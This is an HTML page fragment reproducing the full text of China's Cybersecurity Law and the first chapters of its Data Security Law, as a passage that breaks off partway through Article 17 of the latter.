        <content type="html"><![CDATA[<div class="tabs" id=""><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#-1">网络安全法</button></li><li class="tab"><button type="button" data-href="#-2">数据安全法</button></li><li class="tab"><button type="button" data-href="#-3">个人信息保护法</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="-1"><div id="BodyLabel"><div style="text-align: center;"></div><p style="TEXT-ALIGN: center" align="center"><font><strong>中华人民共和国网络安全法</strong></font></p><p style="TEXT-ALIGN: center" align="center"><font><strong>（2016年11月7日第十二届全国人民代表大会常务委员会第二十四次会议通过）</strong></font></p><p><font>　　目　录</font></p><p><font>　　第一章　总　则</font></p><p><font>　　第二章　网络安全支持与促进</font></p><p><font>　　第三章　网络运行安全</font></p><p><font>　　第一节　一般规定</font></p><p><font>　　第二节　关键信息基础设施的运行安全</font></p><p><font>　　第四章　网络信息安全</font></p><p><font>　　第五章　监测预警与应急处置</font></p><p><font>　　第六章　法律责任</font></p><p><font>　　第七章　附　则</font></p><p><strong>　　第一章　总　则</strong></p><p>　　第一条　为了保障网络安全，维护网络空间主权和国家安全、社会公共利益，保护公民、法人和其他组织的合法权益，促进经济社会信息化健康发展，制定本法。</p><p>　　第二条　在中华人民共和国境内建设、运营、维护和使用网络，以及网络安全的监督管理，适用本法。</p><p>　　第三条　国家坚持网络安全与信息化发展并重，遵循积极利用、科学发展、依法管理、确保安全的方针，推进网络基础设施建设和互联互通，鼓励网络技术创新和应用，支持培养网络安全人才，建立健全网络安全保障体系，提高网络安全保护能力。</p><p>　　第四条　国家制定并不断完善网络安全战略，明确保障网络安全的基本要求和主要目标，提出重点领域的网络安全政策、工作任务和措施。</p><p>　　第五条　国家采取措施，监测、防御、处置来源于中华人民共和国境内外的网络安全风险和威胁，保护关键信息基础设施免受攻击、侵入、干扰和破坏，依法惩治网络违法犯罪活动，维护网络空间安全和秩序。</p><p>　　第六条　国家倡导诚实守信、健康文明的网络行为，推动传播社会主义核心价值观，采取措施提高全社会的网络安全意识和水平，形成全社会共同参与促进网络安全的良好环境。</p><p>　　第七条　国家积极开展网络空间治理、网络技术研发和标准制定、打击网络违法犯罪等方面的国际交流与合作，推动构建和平、安全、开放、合作的网络空间，建立多边、民主、透明的网络治理体系。</p><p>　　第八条　国家网信部门负责统筹协调网络安全工作和相关监督管理工作。国务院电信主管部门、公安部门和其他有关机关依照本法和有关法律、行政法规的规定，在各自职责范围内负责网络安全保护和监督管理工作。</p><p>　　县级以上地方人民政府有关部门的网络安全保护和监督管理职责，按照国家有关规定确定。</p><p>　　第九条　网络运营者开展经营和服务活动，必须遵守法律、行政法规，尊重社会公德，遵守商业道德，诚实信用，履行网络安全保护义务，接受政府和社会的监督，承担社会责任。</p><p>　　第十条　建设、运营网络或者通过网络提供服务，应当依照法律、行政法规的规定和国家标准的强制性要求，采取技术措施和其他必要措施，保障网络安全、稳定运行，有效应对网络安全事件，防范网络违法犯罪活动，维护网络数据的完整性、保密性和可用性。</p><p>　　第十一条　网络相关行业组织按照章程，加强行业自律，制定网络安全行为规范，指导会员加强网络安全保护，提高网络安全保护水平，促进行业健康发展。</p><p>　　第十二条　国家保护公民、法人和其他组织依法使用网络的权利，促进网络接入普及，提升网络服务水平，为社会提供安全、便利的网络服务，保障网络信息依法有序自由流动。</p><p>　　任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得危害网络安全，不得利用网络从事危害国家安全、荣誉和利益，煽动颠覆国家政权、推翻社会主义制度，煽动分裂国家、破坏国家统一，宣扬恐怖主义、极端主义，宣扬民族仇恨、民族歧视，传播暴力、淫秽色情信息，编造、传播虚假信息扰乱经济秩序和社会秩序，以及侵害他人名誉、隐私、知识产权和其他合法权益等活动。</p><p>　　第十三条　国家支持研究开发有利于未成年人健康成长的网络产品和服务，依法惩治利用网络从事危害未成年人身心健康的活动，为未成年人提供安全、健康的网络环境。</p><p>　　第十四条　任何个人和组织有权对危害网络安全的行为向网信、电信、公安等部门举报。收到举报的部门应当及时依法作出处理；不属于本部门职责的，应当及时移送有权处理的部门。</p><p>　　有关部门应当对举报人的相关信息予以保密，保护举报人的合法权益。</p><p><strong>　　第二章　网络安全支持与促进</strong></p><p>　　第十五条　国家建立和完善网络安全标准体系。国务院标准化行政主管部门和国务院其他有关部门根据各自的职责，组织制定并适时修订有关网络安全管理以及网络产品、服务和运行安全的国家标准、行业标准。</p><p>　　国家支持企业、研究机构、高等学校、网络相关行业组织参与网络安全国家标准、行业标准的制定。</p><p>　　第十六条　国务院和省、自治区、直辖市人民政府应当统筹规划，加大投入，扶持重点网络安全技术产业和项目，支持网络安全技术的研究开发和应用，推广安全可信的网络产品和服务，保护网络技术知识产权，支持企业、研究机构和高等学校等参与国家网络安全技术创新项目。</p><p>　　第十七条　国家推进网络安全社会化服务体系建设，鼓励有关企业、机构开展网络安全认证、检测和风险评估等安全服务。</p><p>　　第十八条　国家鼓励开发网络数据安全保护和利用技术，促进公共数据资源开放，推动技术创新和经济社会发展。</p><p>　　国家支持创新网络安全管理方式，运用网络新技术，提升网络安全保护水平。</p><p>　　第十九条　各级人民政府及其有关部门应当组织开展经常性的网络安全宣传教育，并指导、督促有关单位做好网络安全宣传教育工作。</p><p>　　大众传播媒介应当有针对性地面向社会进行网络安全宣传教育。</p><p>　　第二十条　国家支持企业和高等学校、职业学校等教育培训机构开展网络安全相关教育与培训，采取多种方式培养网络安全人才，促进网络安全人才交流。</p><div width="100%"><p></p><p></p></div>  </div><div id="content" class="content1"><div style="text-align: center;"></div> <p><strong>　　第三章　网络运行安全</strong></p><p>　　第一节　一般规定</p><p>　　第二十一条　国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</p><p>　　（一）制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任；</p><p>　　（二）采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施；</p><p>　　（三）采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月；</p><p>　　（四）采取数据分类、重要数据备份和加密等措施；</p><p>　　（五）法律、行政法规规定的其他义务。</p><p>　　第二十二条　网络产品、服务应当符合相关国家标准的强制性要求。网络产品、服务的提供者不得设置恶意程序；发现其网络产品、服务存在安全缺陷、漏洞等风险时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>　　网络产品、服务的提供者应当为其产品、服务持续提供安全维护；在规定或者当事人约定的期限内，不得终止提供安全维护。</p><p>　　网络产品、服务具有收集用户信息功能的，其提供者应当向用户明示并取得同意；涉及用户个人信息的，还应当遵守本法和有关法律、行政法规关于个人信息保护的规定。</p><p>　　第二十三条　网络关键设备和网络安全专用产品应当按照相关国家标准的强制性要求，由具备资格的机构安全认证合格或者安全检测符合要求后，方可销售或者提供。国家网信部门会同国务院有关部门制定、公布网络关键设备和网络安全专用产品目录，并推动安全认证和安全检测结果互认，避免重复认证、检测。</p><p>　　第二十四条　网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务，在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息。用户不提供真实身份信息的，网络运营者不得为其提供相关服务。</p><p>　　国家实施网络可信身份战略，支持研究开发安全、方便的电子身份认证技术，推动不同电子身份认证之间的互认。</p><p>　　第二十五条　网络运营者应当制定网络安全事件应急预案，及时处置系统漏洞、计算机病毒、网络攻击、网络侵入等安全风险；在发生危害网络安全的事件时，立即启动应急预案，采取相应的补救措施，并按照规定向有关主管部门报告。</p><p>　　第二十六条　开展网络安全认证、检测、风险评估等活动，向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息，应当遵守国家有关规定。</p><p>　　第二十七条　任何个人和组织不得从事非法侵入他人网络、干扰他人网络正常功能、窃取网络数据等危害网络安全的活动；不得提供专门用于从事侵入网络、干扰网络正常功能及防护措施、窃取网络数据等危害网络安全活动的程序、工具；明知他人从事危害网络安全的活动的，不得为其提供技术支持、广告推广、支付结算等帮助。</p><p>　　第二十八条　网络运营者应当为公安机关、国家安全机关依法维护国家安全和侦查犯罪的活动提供技术支持和协助。</p><p>　　第二十九条　国家支持网络运营者之间在网络安全信息收集、分析、通报和应急处置等方面进行合作，提高网络运营者的安全保障能力。</p><p>　　有关行业组织建立健全本行业的网络安全保护规范和协作机制，加强对网络安全风险的分析评估，定期向会员进行风险警示，支持、协助会员应对网络安全风险。</p><p>　　第三十条　网信部门和有关部门在履行网络安全保护职责中获取的信息，只能用于维护网络安全的需要，不得用于其他用途。</p><p>　　第二节　关键信息基础设施的运行安全</p><p>　　第三十一条　国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定。</p><p>　　国家鼓励关键信息基础设施以外的网络运营者自愿参与关键信息基础设施保护体系。</p><p>　　第三十二条　按照国务院规定的职责分工，负责关键信息基础设施安全保护工作的部门分别编制并组织实施本行业、本领域的关键信息基础设施安全规划，指导和监督关键信息基础设施运行安全保护工作。</p><p>　　第三十三条　建设关键信息基础设施应当确保其具有支持业务稳定、持续运行的性能，并保证安全技术措施同步规划、同步建设、同步使用。</p><p>　　第三十四条　除本法第二十一条的规定外，关键信息基础设施的运营者还应当履行下列安全保护义务：</p><p>　　（一）设置专门安全管理机构和安全管理负责人，并对该负责人和关键岗位的人员进行安全背景审查；</p><p>　　（二）定期对从业人员进行网络安全教育、技术培训和技能考核；</p><p>　　（三）对重要系统和数据库进行容灾备份；</p><p>　　（四）制定网络安全事件应急预案，并定期进行演练；</p><p>　　（五）法律、行政法规规定的其他义务。</p><p>　　第三十五条　关键信息基础设施的运营者采购网络产品和服务，可能影响国家安全的，应当通过国家网信部门会同国务院有关部门组织的国家安全审查。</p><p>　　第三十六条　关键信息基础设施的运营者采购网络产品和服务，应当按照规定与提供者签订安全保密协议，明确安全和保密义务与责任。</p><p>　　第三十七条　关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的个人信息和重要数据应当在境内存储。因业务需要，确需向境外提供的，应当按照国家网信部门会同国务院有关部门制定的办法进行安全评估；法律、行政法规另有规定的，依照其规定。</p><p>　　第三十八条　关键信息基础设施的运营者应当自行或者委托网络安全服务机构对其网络的安全性和可能存在的风险每年至少进行一次检测评估，并将检测评估情况和改进措施报送相关负责关键信息基础设施安全保护工作的部门。</p><p>　　第三十九条　国家网信部门应当统筹协调有关部门对关键信息基础设施的安全保护采取下列措施：</p><p>　　（一）对关键信息基础设施的安全风险进行抽查检测，提出改进措施，必要时可以委托网络安全服务机构对网络存在的安全风险进行检测评估；</p><p>　　（二）定期组织关键信息基础设施的运营者进行网络安全应急演练，提高应对网络安全事件的水平和协同配合能力；</p><p>　　（三）促进有关部门、关键信息基础设施的运营者以及有关研究机构、网络安全服务机构等之间的网络安全信息共享；</p><p>　　（四）对网络安全事件的应急处置与网络功能的恢复等，提供技术支持和协助。</p><p><strong>　　第四章　网络信息安全</strong></p><p>　　第四十条　网络运营者应当对其收集的用户信息严格保密，并建立健全用户信息保护制度。</p><p>　　第四十一条　网络运营者收集、使用个人信息，应当遵循合法、正当、必要的原则，公开收集、使用规则，明示收集、使用信息的目的、方式和范围，并经被收集者同意。</p><p>　　网络运营者不得收集与其提供的服务无关的个人信息，不得违反法律、行政法规的规定和双方的约定收集、使用个人信息，并应当依照法律、行政法规的规定和与用户的约定，处理其保存的个人信息。</p><p>　　第四十二条　网络运营者不得泄露、篡改、毁损其收集的个人信息；未经被收集者同意，不得向他人提供个人信息。但是，经过处理无法识别特定个人且不能复原的除外。</p><p>　　网络运营者应当采取技术措施和其他必要措施，确保其收集的个人信息安全，防止信息泄露、毁损、丢失。在发生或者可能发生个人信息泄露、毁损、丢失的情况时，应当立即采取补救措施，按照规定及时告知用户并向有关主管部门报告。</p><p>　　第四十三条　个人发现网络运营者违反法律、行政法规的规定或者双方的约定收集、使用其个人信息的，有权要求网络运营者删除其个人信息；发现网络运营者收集、存储的其个人信息有错误的，有权要求网络运营者予以更正。网络运营者应当采取措施予以删除或者更正。</p><p>　　第四十四条　任何个人和组织不得窃取或者以其他非法方式获取个人信息，不得非法出售或者非法向他人提供个人信息。</p><p>　　第四十五条　依法负有网络安全监督管理职责的部门及其工作人员，必须对在履行职责中知悉的个人信息、隐私和商业秘密严格保密，不得泄露、出售或者非法向他人提供。</p><p>　　第四十六条　任何个人和组织应当对其使用网络的行为负责，不得设立用于实施诈骗，传授犯罪方法，制作或者销售违禁物品、管制物品等违法犯罪活动的网站、通讯群组，不得利用网络发布涉及实施诈骗，制作或者销售违禁物品、管制物品以及其他违法犯罪活动的信息。</p><p>　　第四十七条　网络运营者应当加强对其用户发布的信息的管理，发现法律、行政法规禁止发布或者传输的信息的，应当立即停止传输该信息，采取消除等处置措施，防止信息扩散，保存有关记录，并向有关主管部门报告。</p><p>　　第四十八条　任何个人和组织发送的电子信息、提供的应用软件，不得设置恶意程序，不得含有法律、行政法规禁止发布或者传输的信息。</p><p>　　电子信息发送服务提供者和应用软件下载服务提供者，应当履行安全管理义务，知道其用户有前款规定行为的，应当停止提供服务，采取消除等处置措施，保存有关记录，并向有关主管部门报告。</p><p>　　第四十九条　网络运营者应当建立网络信息安全投诉、举报制度，公布投诉、举报方式等信息，及时受理并处理有关网络信息安全的投诉和举报。</p><p>　　网络运营者对网信部门和有关部门依法实施的监督检查，应当予以配合。</p><p>　　第五十条　国家网信部门和有关部门依法履行网络信息安全监督管理职责，发现法律、行政法规禁止发布或者传输的信息的，应当要求网络运营者停止传输，采取消除等处置措施，保存有关记录；对来源于中华人民共和国境外的上述信息，应当通知有关机构采取技术措施和其他必要措施阻断传播。</p><div width="100%"><p></p><p></p></div>  </div><div id="content" class="content1"><div style="text-align: center;"></div> <p><strong>　　第五章　监测预警与应急处置</strong></p><p>　　第五十一条　国家建立网络安全监测预警和信息通报制度。国家网信部门应当统筹协调有关部门加强网络安全信息收集、分析和通报工作，按照规定统一发布网络安全监测预警信息。</p><p>　　第五十二条　负责关键信息基础设施安全保护工作的部门，应当建立健全本行业、本领域的网络安全监测预警和信息通报制度，并按照规定报送网络安全监测预警信息。</p><p>　　第五十三条　国家网信部门协调有关部门建立健全网络安全风险评估和应急工作机制，制定网络安全事件应急预案，并定期组织演练。</p><p>　　负责关键信息基础设施安全保护工作的部门应当制定本行业、本领域的网络安全事件应急预案，并定期组织演练。</p><p>　　网络安全事件应急预案应当按照事件发生后的危害程度、影响范围等因素对网络安全事件进行分级，并规定相应的应急处置措施。</p><p>　　第五十四条　网络安全事件发生的风险增大时，省级以上人民政府有关部门应当按照规定的权限和程序，并根据网络安全风险的特点和可能造成的危害，采取下列措施：</p><p>　　（一）要求有关部门、机构和人员及时收集、报告有关信息，加强对网络安全风险的监测；</p><p>　　（二）组织有关部门、机构和专业人员，对网络安全风险信息进行分析评估，预测事件发生的可能性、影响范围和危害程度；</p><p>　　（三）向社会发布网络安全风险预警，发布避免、减轻危害的措施。</p><p>　　第五十五条　发生网络安全事件，应当立即启动网络安全事件应急预案，对网络安全事件进行调查和评估，要求网络运营者采取技术措施和其他必要措施，消除安全隐患，防止危害扩大，并及时向社会发布与公众有关的警示信息。</p><p>　　第五十六条　省级以上人民政府有关部门在履行网络安全监督管理职责中，发现网络存在较大安全风险或者发生安全事件的，可以按照规定的权限和程序对该网络的运营者的法定代表人或者主要负责人进行约谈。网络运营者应当按照要求采取措施，进行整改，消除隐患。</p><p>　　第五十七条　因网络安全事件，发生突发事件或者生产安全事故的，应当依照《中华人民共和国突发事件应对法》、《中华人民共和国安全生产法》等有关法律、行政法规的规定处置。</p><p>　　第五十八条　因维护国家安全和社会公共秩序，处置重大突发社会安全事件的需要，经国务院决定或者批准，可以在特定区域对网络通信采取限制等临时措施。</p><p><strong>　　第六章　法律责任</strong></p><p>　　第五十九条　网络运营者不履行本法第二十一条、第二十五条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处一万元以上十万元以下罚款，对直接负责的主管人员处五千元以上五万元以下罚款。</p><p>　　关键信息基础设施的运营者不履行本法第三十三条、第三十四条、第三十六条、第三十八条规定的网络安全保护义务的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处十万元以上一百万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款。</p><p>　　第六十条　违反本法第二十二条第一款、第二款和第四十八条第一款规定，有下列行为之一的，由有关主管部门责令改正，给予警告；拒不改正或者导致危害网络安全等后果的，处五万元以上五十万元以下罚款，对直接负责的主管人员处一万元以上十万元以下罚款：</p><p>　　（一）设置恶意程序的；</p><p>　　（二）对其产品、服务存在的安全缺陷、漏洞等风险未立即采取补救措施，或者未按照规定及时告知用户并向有关主管部门报告的；</p><p>　　（三）擅自终止为其产品、服务提供安全维护的。</p><p>　　第六十一条　网络运营者违反本法第二十四条第一款规定，未要求用户提供真实身份信息，或者对不提供真实身份信息的用户提供相关服务的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>　　第六十二条　违反本法第二十六条规定，开展网络安全认证、检测、风险评估等活动，或者向社会发布系统漏洞、计算机病毒、网络攻击、网络侵入等网络安全信息的，由有关主管部门责令改正，给予警告；拒不改正或者情节严重的，处一万元以上十万元以下罚款，并可以由有关主管部门责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五千元以上五万元以下罚款。</p><p>　　第六十三条　违反本法第二十七条规定，从事危害网络安全的活动，或者提供专门用于从事危害网络安全活动的程序、工具，或者为他人从事危害网络安全的活动提供技术支持、广告推广、支付结算等帮助，尚不构成犯罪的，由公安机关没收违法所得，处五日以下拘留，可以并处五万元以上五十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处十万元以上一百万元以下罚款。</p><p>　　单位有前款行为的，由公安机关没收违法所得，处十万元以上一百万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>　　违反本法第二十七条规定，受到治安管理处罚的人员，五年内不得从事网络安全管理和网络运营关键岗位的工作；受到刑事处罚的人员，终身不得从事网络安全管理和网络运营关键岗位的工作。</p><p>　　第六十四条　网络运营者、网络产品或者服务的提供者违反本法第二十二条第三款、第四十一条至第四十三条规定，侵害个人信息依法得到保护的权利的，由有关主管部门责令改正，可以根据情节单处或者并处警告、没收违法所得、处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款；情节严重的，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照。</p><p>　　违反本法第四十四条规定，窃取或者以其他非法方式获取、非法出售或者非法向他人提供个人信息，尚不构成犯罪的，由公安机关没收违法所得，并处违法所得一倍以上十倍以下罚款，没有违法所得的，处一百万元以下罚款。</p><p>　　第六十五条　关键信息基础设施的运营者违反本法第三十五条规定，使用未经安全审查或者安全审查未通过的网络产品或者服务的，由有关主管部门责令停止使用，处采购金额一倍以上十倍以下罚款；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>　　第六十六条　关键信息基础设施的运营者违反本法第三十七条规定，在境外存储网络数据，或者向境外提供网络数据的，由有关主管部门责令改正，给予警告，没收违法所得，处五万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>　　第六十七条　违反本法第四十六条规定，设立用于实施违法犯罪活动的网站、通讯群组，或者利用网络发布涉及实施违法犯罪活动的信息，尚不构成犯罪的，由公安机关处五日以下拘留，可以并处一万元以上十万元以下罚款；情节较重的，处五日以上十五日以下拘留，可以并处五万元以上五十万元以下罚款。关闭用于实施违法犯罪活动的网站、通讯群组。</p><p>　　单位有前款行为的，由公安机关处十万元以上五十万元以下罚款，并对直接负责的主管人员和其他直接责任人员依照前款规定处罚。</p><p>　　第六十八条　网络运营者违反本法第四十七条规定，对法律、行政法规禁止发布或者传输的信息未停止传输、采取消除等处置措施、保存有关记录的，由有关主管部门责令改正，给予警告，没收违法所得；拒不改正或者情节严重的，处十万元以上五十万元以下罚款，并可以责令暂停相关业务、停业整顿、关闭网站、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p>　　电子信息发送服务提供者、应用软件下载服务提供者，不履行本法第四十八条第二款规定的安全管理义务的，依照前款规定处罚。</p><p>　　第六十九条　网络运营者违反本法规定，有下列行为之一的，由有关主管部门责令改正；拒不改正或者情节严重的，处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员，处一万元以上十万元以下罚款：</p><p>　　（一）不按照有关部门的要求对法律、行政法规禁止发布或者传输的信息，采取停止传输、消除等处置措施的；</p><p>　　（二）拒绝、阻碍有关部门依法实施的监督检查的；</p><p>　　（三）拒不向公安机关、国家安全机关提供技术支持和协助的。</p><p>　　第七十条　发布或者传输本法第十二条第二款和其他法律、行政法规禁止发布或者传输的信息的，依照有关法律、行政法规的规定处罚。</p><p>　　第七十一条　有本法规定的违法行为的，依照有关法律、行政法规的规定记入信用档案，并予以公示。</p><p>　　第七十二条　国家机关政务网络的运营者不履行本法规定的网络安全保护义务的，由其上级机关或者有关机关责令改正；对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>　　第七十三条　网信部门和有关部门违反本法第三十条规定，将在履行网络安全保护职责中获取的信息用于其他用途的，对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p>　　网信部门和有关部门的工作人员玩忽职守、滥用职权、徇私舞弊，尚不构成犯罪的，依法给予处分。</p><p>　　第七十四条　违反本法规定，给他人造成损害的，依法承担民事责任。</p><p>　　违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p><p>　　第七十五条　境外的机构、组织、个人从事攻击、侵入、干扰、破坏等危害中华人民共和国的关键信息基础设施的活动，造成严重后果的，依法追究法律责任；国务院公安部门和有关部门并可以决定对该机构、组织、个人采取冻结财产或者其他必要的制裁措施。</p><p><strong>　　第七章　附　则</strong></p><p>　　第七十六条　本法下列用语的含义：</p><p>　　（一）网络，是指由计算机或者其他信息终端及相关设备组成的按照一定的规则和程序对信息进行收集、存储、传输、交换、处理的系统。</p><p>　　（二）网络安全，是指通过采取必要措施，防范对网络的攻击、侵入、干扰、破坏和非法使用以及意外事故，使网络处于稳定可靠运行的状态，以及保障网络数据的完整性、保密性、可用性的能力。</p><p>　　（三）网络运营者，是指网络的所有者、管理者和网络服务提供者。</p><p>　　（四）网络数据，是指通过网络收集、存储、传输、处理和产生的各种电子数据。</p><p>　　（五）个人信息，是指以电子或者其他方式记录的能够单独或者与其他信息结合识别自然人个人身份的各种信息，包括但不限于自然人的姓名、出生日期、身份证件号码、个人生物识别信息、住址、电话号码等。</p><p>　　第七十七条　存储、处理涉及国家秘密信息的网络的运行安全保护，除应当遵守本法外，还应当遵守保密法律、行政法规的规定。</p><p>　　第七十八条　军事网络的安全保护，由中央军事委员会另行规定。</p><p>　　第七十九条　本法自2017年6月1日起施行。</p><div width="100%"><p></p><p></p></div>  </div><p><strong>原文链接：<a href="http://www.cac.gov.cn/2016-11/07/c_1119867116.htm">http://www.cac.gov.cn/2016-11/07/c_1119867116.htm</a></strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-2"><meta name="others" content="页面生成时间 2021-06-11 07:47:10" /><meta name="template,templategroup,version" content="96f845d7fd954048bb88032c6816fc92,default,5.5" /><title></title><subtitle></subtitle><introtitle></introtitle><p style="text-align: center;"><span style="font-family: 黑体;">中华人民共和国数据安全法</span></p><p style="text-align: center;"><span style="font-family: 黑体;">（2021年6月10日第十三届全国人民代表大会常务委员会第二十九次会议通过）</span></p><p style="text-align: center;"><span style="font-family: 黑体;">目　　录</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第一章　总　　则</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第二章　数据安全与发展</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第三章　数据安全制度</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第四章　数据安全保护义务</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第五章　政务数据安全与开放</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第六章　法律责任</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第七章　附　　则</span></p><p style="text-align: center;"><span style="font-family: 黑体;">第一章　总　　则</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第一条</span>　为了规范数据处理活动，保障数据安全，促进数据开发利用，保护个人、组织的合法权益，维护国家主权、安全和发展利益，制定本法。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二条</span>　在中华人民共和国境内开展数据处理活动及其安全监管，适用本法。</p><p style="text-indent: 2em;">在中华人民共和国境外开展数据处理活动，损害中华人民共和国国家安全、公共利益或者公民、组织合法权益的，依法追究法律责任。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三条</span>　本法所称数据，是指任何以电子或者其他方式对信息的记录。</p><p style="text-indent: 2em;">数据处理，包括数据的收集、存储、使用、加工、传输、提供、公开等。</p><p style="text-indent: 2em;">数据安全，是指通过采取必要措施，确保数据处于有效保护和合法利用的状态，以及具备保障持续安全状态的能力。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四条</span>　维护数据安全，应当坚持总体国家安全观，建立健全数据安全治理体系，提高数据安全保障能力。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五条</span>　中央国家安全领导机构负责国家数据安全工作的决策和议事协调，研究制定、指导实施国家数据安全战略和有关重大方针政策，统筹协调国家数据安全的重大事项和重要工作，建立国家数据安全工作协调机制。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第六条</span>　各地区、各部门对本地区、本部门工作中收集和产生的数据及数据安全负责。</p><p style="text-indent: 2em;">工业、电信、交通、金融、自然资源、卫生健康、教育、科技等主管部门承担本行业、本领域数据安全监管职责。</p><p style="text-indent: 2em;">公安机关、国家安全机关等依照本法和有关法律、行政法规的规定，在各自职责范围内承担数据安全监管职责。</p><p style="text-indent: 2em;">国家网信部门依照本法和有关法律、行政法规的规定，负责统筹协调网络数据安全和相关监管工作。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第七条</span>　国家保护个人、组织与数据有关的权益，鼓励数据依法合理有效利用，保障数据依法有序自由流动，促进以数据为关键要素的数字经济发展。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第八条</span>　开展数据处理活动，应当遵守法律、法规，尊重社会公德和伦理，遵守商业道德和职业道德，诚实守信，履行数据安全保护义务，承担社会责任，不得危害国家安全、公共利益，不得损害个人、组织的合法权益。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第九条</span>　国家支持开展数据安全知识宣传普及，提高全社会的数据安全保护意识和水平，推动有关部门、行业组织、科研机构、企业、个人等共同参与数据安全保护工作，形成全社会共同维护数据安全和促进发展的良好环境。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十条</span>　相关行业组织按照章程，依法制定数据安全行为规范和团体标准，加强行业自律，指导会员加强数据安全保护，提高数据安全保护水平，促进行业健康发展。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十一条</span>　国家积极开展数据安全治理、数据开发利用等领域的国际交流与合作，参与数据安全相关国际规则和标准的制定，促进数据跨境安全、自由流动。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十二条</span>　任何个人、组织都有权对违反本法规定的行为向有关主管部门投诉、举报。收到投诉、举报的部门应当及时依法处理。</p><p style="text-indent: 2em;">有关主管部门应当对投诉、举报人的相关信息予以保密，保护投诉、举报人的合法权益。</p><p style="text-align: center;"><span style="font-family: 黑体;">第二章　数据安全与发展</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十三条</span>　国家统筹发展和安全，坚持以数据开发利用和产业发展促进数据安全，以数据安全保障数据开发利用和产业发展。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十四条</span>　国家实施大数据战略，推进数据基础设施建设，鼓励和支持数据在各行业、各领域的创新应用。</p><p style="text-indent: 2em;">省级以上人民政府应当将数字经济发展纳入本级国民经济和社会发展规划，并根据需要制定数字经济发展规划。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十五条</span>　国家支持开发利用数据提升公共服务的智能化水平。提供智能化公共服务，应当充分考虑老年人、残疾人的需求，避免对老年人、残疾人的日常生活造成障碍。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十六条</span>　国家支持数据开发利用和数据安全技术研究，鼓励数据开发利用和数据安全等领域的技术推广和商业创新，培育、发展数据开发利用和数据安全产品、产业体系。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十七条</span>　国家推进数据开发利用技术和数据安全标准体系建设。国务院标准化行政主管部门和国务院有关部门根据各自的职责，组织制定并适时修订有关数据开发利用技术、产品和数据安全相关标准。国家支持企业、社会团体和教育、科研机构等参与标准制定。</p><p style="text-indent: 2em;"><span 